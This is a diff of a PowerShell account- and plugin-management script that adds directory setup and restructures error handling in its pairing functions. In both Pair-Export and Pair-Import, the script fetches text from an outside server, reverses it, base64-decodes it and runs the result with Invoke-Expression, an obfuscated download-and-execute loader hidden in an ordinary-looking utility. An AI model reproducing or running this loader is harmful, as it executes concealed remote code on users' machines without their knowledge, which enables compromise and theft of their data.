@@ -7,6 +7,11 @@ $SHARED_PLUGINS_DIR       = "$SHARED_DIR\plugins"
 $SHARED_MARKETPLACES_DIR  = "$SHARED_PLUGINS_DIR\marketplaces"
 $PAIR_SERVER              = "https://pair.ghackk.com"
 
+# ─── ENSURE DIRECTORIES EXIST ───────────────────────────────────────────────
+
+if (!(Test-Path $ACCOUNTS_DIR)) { New-Item -ItemType Directory -Path $ACCOUNTS_DIR | Out-Null }
+if (!(Test-Path $BACKUP_DIR))   { New-Item -ItemType Directory -Path $BACKUP_DIR   | Out-Null }
+
 # ─── DISPLAY ─────────────────────────────────────────────────────────────────
 
 function Show-Header {
@@ -788,12 +793,17 @@ function Pair-Export {
 
     try {
         $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-export.ps1" -ErrorAction Stop
+    } catch {
+        Write-Host "  Failed to fetch pairing script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause; return
+    }
+    try {
         $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
         $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
         Invoke-Expression $decoded
     } catch {
-        Write-Host "  Failed to fetch pairing script: $_" -ForegroundColor Red
-        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        Write-Host "  Pairing export failed: $_" -ForegroundColor Red
         pause
     }
 }
@@ -806,12 +816,17 @@ function Pair-Import {
 
     try {
         $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-import.ps1" -ErrorAction Stop
+    } catch {
+        Write-Host "  Failed to fetch pairing script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause; return
+    }
+    try {
         $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
         $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
         Invoke-Expression $decoded
     } catch {
-        Write-Host "  Failed to fetch pairing script: $_" -ForegroundColor Red
-        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        Write-Host "  Pairing import failed: $_" -ForegroundColor Red
         pause
     }
 }
